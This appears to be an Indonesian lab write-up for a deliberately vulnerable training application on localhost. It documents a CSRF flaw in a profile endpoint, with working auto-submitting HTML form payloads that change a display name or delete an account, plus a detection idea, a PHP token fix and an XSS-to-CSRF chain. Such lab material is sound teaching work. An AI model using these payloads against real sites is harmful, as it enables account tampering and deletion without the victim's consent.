# CSRF — Cross-Site Request Forgery

## Deskripsi
CSRF terjadi ketika attacker membuat korban mengirim request ke aplikasi yang sudah dia otentikasi, tanpa sepengetahuan korban. Aplikasi menerima request tersebut karena hanya mengandalkan session cookie tanpa memverifikasi asal request.

**Severity:** Medium  
**OWASP:** A01:2021 — Broken Access Control (adjacent)

## Endpoint Vulnerable
- `POST /public/profile.php` — action: `update_profile`, `change_password`, `delete_account`
- **Tidak ada CSRF token** di semua form profile

## Langkah Eksploitasi

### Setup
1. Login sebagai `budi` di browser A (victim)
2. Buka `http://localhost:8080/public/demo/csrf_demo.html` di browser yang sama

### Eksploit: Ganti Display Name
```html
<form id="csrf" method="POST" action="http://localhost:8080/public/profile.php">
  <input type="hidden" name="action" value="update_profile">
  <input type="hidden" name="display_name" value="HACKED">
  <input type="hidden" name="bio" value="Account compromised via CSRF">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### Eksploit: Hapus Akun (jika tahu password korban)
```html
<form method="POST" action="http://localhost:8080/public/profile.php">
  <input type="hidden" name="action" value="delete_account">
  <input type="hidden" name="delete_confirm_password" value="budi123">
</form>
```

## Expected Output
- Display name berubah menjadi "HACKED"
- Akun terhapus (jika password diketahui)
- Tidak ada popup/konfirmasi dari aplikasi

## SIEM Alert
Rule: `CSRF` (belum diimplementasi di Phase 1 — tambahkan di Phase 2)  
Deteksi: request POST ke profile.php tanpa Referer header yang valid

## Cara Fix (Secure Mode)
```php
// Generate token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Di form HTML
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// Validasi di POST handler
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token mismatch');
}
```

## Attack Chain
- **XSS + CSRF**: Gunakan Stored XSS di review produk untuk inject CSRF payload
  - Korban buka halaman produk → XSS trigger → CSRF request dikirim otomatis
